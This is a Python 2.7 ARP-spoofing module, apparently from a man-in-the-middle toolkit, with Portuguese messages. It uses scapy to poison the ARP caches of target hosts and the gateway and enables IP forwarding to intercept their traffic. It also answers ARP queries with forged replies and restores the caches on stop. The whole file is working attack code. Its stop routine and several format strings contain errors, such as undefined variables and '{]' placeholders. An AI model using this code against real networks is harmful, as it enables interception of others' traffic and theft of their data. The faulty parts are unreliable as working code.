#!/usr/bin/env python2.7
#coding=UTF-8

from scapy.all import *
from netaddr import IPNetwork, IPRange, IPAddress, AddrFormatError
import threading
from time import sleep
from utils import *


class ARPspoof(object):


	def __init__(self, gateway, targets, interface, arpmode, myip, mymac):

		try:
			self.gateway = str(IPAddress(gateway))
		except AddrFormatError as e:
			sys.exit("[-] Especifique um endereço IP válido como gateway")

		self.gateway_mac = getmacbyip(gateway)
		if not self.gateway_mac: sys.exit("[-] Erro: não foi possível resolver o endereço MAC do gateway.")

		
		self.targets	= self.get_range(targets)
		self.arpmode	= arpmode
		self.send	= True
		self.interval	= 3
		self.interface	= interface
		self.myip	= myip
		self.mymac	= mymac
		self.arp_cache	= {}



	def start(self):
		self.socket = conf.L3socket(iface=self.interface)
		self.socket2 = conf.L2socket(iface=self.interface)
		set_ip_forwarding(1)
		iptables()
		

		if self.arpmode == 'rep':
			t = threading.Thread(name='ARPspoof-rep', target=self.spoof, args=('is-at',))

		elif self.arpmode == 'req':
			t = threading.Thread(name='ARPspoof-req', target=self.spoof, args=('who-has',))

		t.setDaemon(True)
		t.start()

		if self.targets is None:
			t = threading.Thread(name='ARPmon', target=self.start_arp_mon)
			t.setDaemon(True)
			t.start()

	def get_range(self, targets):
		if targets is None:
			return None

		try:
			target_list = []
			for target in targets.split(','):


				if '/' in target:
					target_list.extend(list(IPNetwork(target)))

				elif '-' in target:
					start_addr = IPAddress(target.split('-')[0])
					try:
						end_addr = IPAddress(target.split('-')[1])
						ip_range = IPRange(start_addr, end_addr)

					except AddrFormatError:
						end_addr = list(start_addr.words)
						end_addr[-1] = target.split('-')[1]
						end_addr = IPAddress('.'.join(map(str, end_addr)))
						ip_range = IPRange(start_addr, end_addr)

					

					target_list.extend(list(ip_range))

				else:
					target_list.append(IPAddress(target))

			return target_list

		except AddrFormatError:
			sys.exit("Especifique um Endereço/Range IP válido como alvo.")


	def start_arp_mon(self):
		try:
			sniff(prn=self.arp_mon_callback, filter="arp", store=0)
		except Exception as e:
			if "Interrupted system call" not in e:
				print "Exceção ocorreu enquanto iniciava o sniffer: {}".format(e)

	def arp_mon_callback(self,pkt):
		if self.send is True:
			if ARP in pkt and pkt[ARP].op == 1:
				packet = None

				if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gateway and self.myip != str(pkt[ARP].psrc)):
					print '[ARPmon] {} está perguntando quem é o gateway. Enviando : "Eu sou o gateway!" como resposta'.format(pkt[ARP].psrc)
					packet = ARP()
					packet.op = 2
					packet.psrc = self.gateway
					packet.hwdst = str(pkt[ARP].hwsrc)
					packet.pdst = str(pkt[ARP].psrc)

				elif (str(pkt[ARP].hwsrc) == self.gateway_mac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip != str(pkt[ARP].pdst)):
					print '[ARPmon] Gateway está perguntando onde {] está. Enviando: "Eu sou {] como resposta"'.format(pkt[ARP].pdst, pkt[ARP].pdst)
					packet = ARP()
					packet.op = 2
					packet.psrc = self.gateway
					packet.hwdst = '00:00:00:00:00:00'
					packet.pdst = str(pkt[ARP].pdst)

				elif (str(pkt[ARP].hwsrc) == self.gateway_mac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
					print "[ARPmon] Gateway está perguntando onde está {}. Enviando: 'Sou {}!'".format(pkt[ARP].pdst)
					packet = ARP()
					packet.op = 2
					packet.psrc = self.myip
					packet.hwdst = str(pkt[ARP].hwsrc)
					packet.pdst = str(pkt[ARP].psrc)
				try:
					if packet is not None:
						self.socket.send(packet)
				except Exception as e:
					if "Interrupted system call" not in e:
						print "[ARPmon] Exceção ocorreu enquanto re-envenenava pacote: {}".format(e)



	def resolve_target_mac(self, targetip):
		targetmac = None

		try:
			targetmac = self.arp_cache[targetip]

		except KeyError:
			packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op="who-has", pdst=targetip)

			try:
				resp, _ = sndrcv(self.socket2, packet, timeout=2, verbose=False)
			except Exception as e:
				resp = ''
				if "Interrupted system call" not in e:
					print "[!] Exceção ocorreu enquanto envenenava {}: {}".format(targetip, e)
			if len(resp) > 0:
				targetmac = resp[0][1].hwsrc
				self.arp_cache[targetip] = targetmac
				print "Resolvido {} --> {}".format(targetip, targetmac)
			else:
				print "Não foi possivel resolver o endereço MAC de {}".format(targetip)
		return targetmac





	def spoof(self, arpmode):
		sleep(2)
		while self.send:

			if self.targets is None:
				self.socket2.send(Ether(src=self.mymac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=self.mymac, psrc=self.gateway, op=arpmode))

			elif self.targets:
				for target in self.targets:
					targetip = str(target)

					if (targetip != self.myip):
						targetmac = self.resolve_target_mac(targetip)

						
						if targetmac is not None:
							try:
								print "[+]Evenenando {} <--> {}".format(targetip, self.gateway)
								self.socket2.send(Ether(src=self.mymac, dst=targetmac)/ARP(pdst=targetip, psrc=self.gateway, hwdst=targetmac, op=arpmode))
								self.socket2.send(Ether(src=targetmac, dst=self.gateway_mac)/ARP(pdst=self.gateway, psrc=targetip, hwdst=self.gateway_mac, op=arpmode))
						
							except Exception as e:
								if "Interrupted system call" not in e:
									print "[!] Exceção ocorreu enquanto envenenava {}: {}".format(targetip, e)
			sleep(self.interval)



	
	def stop(self):
		self.send = False
		sleep(3)
		count = 2

		if self.targets is None:
			print "[*] Restaurando conexão de sub-rede com {} pacotes".format(count)
			pkt = Ether(src=self.gateway_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=self.gateway_mac, psrc=self.gateway, op="is-at")
			for i in range(0, count):
				self.socket2.send(pkt)

		elif self.targets:
			for target in self.targets:
				target_ip = str(target)
				target_mac = self.resolve_target_mac(target_ip)

				if targetmac is not None:
					print "[+] Restaurando conexão {} <--> {} com {} pacotes por host".format(target_ip, self.gateway, count)

					try:
						for i in range(0,count):
							self.socket2.send(Ether(src=targetmac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=self.gateway, psrc=targetip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac))
							self.socket2.send(Ether(src=self.gateway_mac, dst='ff:ff:ff:ff:ff:ff')/ARP(op="is-at", pdst=targetip, psrc=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac))
					except Exception as e:
						if "Interrupted system call" not in e:
							print "Exceção ocorreu enquanto envenava {}: {}".format(targetip, e)

		
		set_ip_forwarding(0)
		self.socket.close()
		self.socket2.close()
